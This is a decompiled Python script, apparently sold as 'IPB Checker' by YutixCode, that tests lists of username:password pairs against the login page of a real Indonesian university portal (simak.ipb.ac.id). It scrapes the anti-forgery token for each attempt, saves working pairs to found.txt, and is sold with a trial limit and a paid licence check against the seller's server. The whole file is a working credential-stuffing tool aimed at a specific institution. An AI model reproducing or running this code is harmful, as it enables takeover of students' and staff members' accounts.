# uncompyle6 version 3.7.3
# Python bytecode 3.8
# Decompiled from: Python 3.8.5 (default, Jul 24 2020, 12:30:11) 
# [Clang 9.0.8 (https://android.googlesource.com/toolchain/llvm-project 98c855489
# Embedded file name: <EzzKun>
import os, time, random, platform, urllib.parse, requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
from concurrent.futures import ThreadPoolExecutor
try:
    import requests as req
    from bs4 import BeautifulSoup as bs
except:
    os.system('pip install requests bs4')
    exit(f"\n{yellow}[!] {white}Silahkan restart script")
else:
    grey = '\x1b[90m'
    red = '\x1b[91m'
    green = '\x1b[92m'
    yellow = '\x1b[93m'
    blue = '\x1b[94m'
    purple = '\x1b[95m'
    cyan = '\x1b[96m'
    white = '\x1b[37m'
    flag = '\x1b[47;30m'
    off = '\x1b[m'
    rv = platform.uname()
    me = rv.release
    found = []
    error = []

    def cek(usr, pwd):
        try:
            url = 'https://simak.ipb.ac.id/Account/Login'
            ses = req.Session()
            row = ses.get(url).text
            tok = bs(row, 'html.parser').findAll('input')[0]['value']
            dat = {'__RequestVerificationToken':tok, 
             'UserName':usr, 
             'Password':pwd}
            raw = ses.post(url, data=dat).text
            try:
                her = bs(raw, 'html.parser').findAll('span')[6].get_text()
                print(f"{white}  >{green} Login ok {white}-{green} {usr}{white}:{green}{pwd}")
                found.append(f"{usr}:{pwd}")
                with open('found.txt', 'a') as (save):
                    save.write(f"{usr}:{pwd}\n")
            except IndexError:
                print(f"{white}  >{red} Login error {white}-{red} {usr}{white}:{red}{pwd}")
                error.append(f"{usr}:{pwd}")

        except KeyboardInterrupt:
            exit()


    def premium():
        print(f"{green}  [{white}1{green}] {white}Single check \n" + f"{green}  [{white}2{green}] {white}Multi check \n")
        try:
            select = input(f"{white} Premium {cyan}> {white}")
            if select == '1':
                print('\n' + f"{cyan}  [{white}?{cyan}] {white}username:password")
                data = input(f"{cyan}  >>>{white} ")
                user = data.split(':')[0]
                pswd = data.split(':')[1]
                cek(user, pswd)
            else:
                if select == '2':
                    print('\n' + f"{cyan}  [{white}?{cyan}] {white}File berisi username:password")
                    path = input(f"{cyan}  [{white}?{cyan}] {white}Input file: ")
                    with open(path, 'r') as (file):
                        lines = file.readlines()
                        print(f"{cyan}  [{white}+{cyan}] {white}terbaca {len(lines)} data login\n")
                        for line in lines:
                            user = line.strip().split(':')[0]
                            pswd = line.strip().split(':')[1]
                            cek(user, pswd)
                        else:
                            print('\n' + f"{cyan}  [{white}+{cyan}]{white} Found: {green}{len(found)}" + f"{cyan}  |{white} Error: {red}{len(error)}")
                            exit()

        except IndexError:
            exit(f"  {red}[{white}!{red}]{white} Input data tidak benar")
        except FileNotFoundError:
            exit(f"  {red}[{white}!{red}]{white} File tidak ditemukan")
        except KeyboardInterrupt:
            pass


    def trial():
        print(f"{green}  [{white}1{green}] {white}Single check \n" + f"{green}  [{white}2{green}] {white}Multi check \n")
        try:
            select = input(f"{white} Trial {cyan}> {white}")
            if select == '1':
                print('\n' + f"{cyan}  [{white}?{cyan}] {white}username:password")
                data = input(f"{cyan}  >>>{white} ")
                user = data.split(':')[0]
                pswd = data.split(':')[1]
                cek(user, pswd)
            else:
                if select == '2':
                    print('\n' + f"{cyan}  [{white}?{cyan}] {white}File berisi username:password")
                    path = input(f"{cyan}  [{white}?{cyan}] {white}Input file: ")
                    with open(path, 'r') as (file):
                        count = 1
                        lines = file.readlines()
                        print(f"{cyan}  [{white}+{cyan}] {white}terbaca {len(lines)} data login\n")
                        for line in lines:
                            user = line.strip().split(':')[0]
                            pswd = line.strip().split(':')[1]
                            cek(user, pswd)
                            time.sleep(5)
                            count += 1
                            if count == 6:
                                sisa = len(lines) - 5
                                print('\n' + f"{cyan}  [{white}+{cyan}]{white} Found: {green}{len(found)}" + f"{cyan}  |{white} Error: {red}{len(error)}" + f"{cyan}  |{white} Sisa: {yellow}{sisa}\n" + f"{cyan}  [{white}+{cyan}]{white} Upgrade untuk scan tanpa batas\n" + f"{cyan}  [{white}+{cyan}]{white} Dan nikmati scan tanpa lebih cepat")
                                up = input(f"{cyan}  [{white}+{cyan}]{white} Upgrade sekarang? (y/n) : ").lower()
                                if up == 'y':
                                    msg = f"Saya ingin upgrade IPB Checker\nAccessCode: {me}"
                                    os.system(f"xdg-open https://wa.me/+6282321062760?text={urllib.parse.quote(msg, safe='')}")
                                    exit(f"{cyan}  [{white}+{cyan}]{white} AccessCode: {green}{me}")
                                else:
                                    exit()

        except IndexError:
            exit(f"  {red}[{white}!{red}]{white} Input data tidak benar")
        except FileNotFoundError:
            exit(f"  {red}[{white}!{red}]{white} File tidak ditemukan")
        except KeyboardInterrupt:
            pass


    def main():
        try:
            lisensi = req.get(f"https://yutixcode.xyz/akses/ipb/{me}", verify=False).status_code
        except KeyboardInterrupt:
            exit(f"{white}[!] {red}Interrupted")
        except:
            exit(f"{white}[!] {red}Internet error")
        else:
            print(f" {flag} IPB Checker | by YutixCode {off}\n")
            if lisensi == 200:
                premium()
            else:
                trial()


    if __name__ == '__main__':
        main()